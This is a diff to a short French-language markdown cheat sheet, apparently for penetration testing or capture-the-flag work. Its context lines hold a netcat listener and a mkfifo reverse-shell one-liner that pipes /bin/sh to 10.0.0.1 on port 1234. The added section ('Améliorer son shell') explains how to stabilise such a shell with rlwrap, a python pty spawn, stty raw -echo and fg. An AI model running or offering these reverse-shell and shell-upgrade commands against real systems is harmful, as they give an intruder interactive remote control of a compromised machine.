@@ -28,5 +28,25 @@ nc -lvnp 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
+## Améliorer son shell
 
+Minimal : utiliser rlwrap
+```bash
+rlwrap nc -lvnp 1234
+```
 
+### Mieux si python
+
+Dans le shell
+```
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+
+`Ctrl + Z` pour passer en arrière plan
+
+```bash
+stty raw -echo
+
+fg
+export TERM=xterm
+```
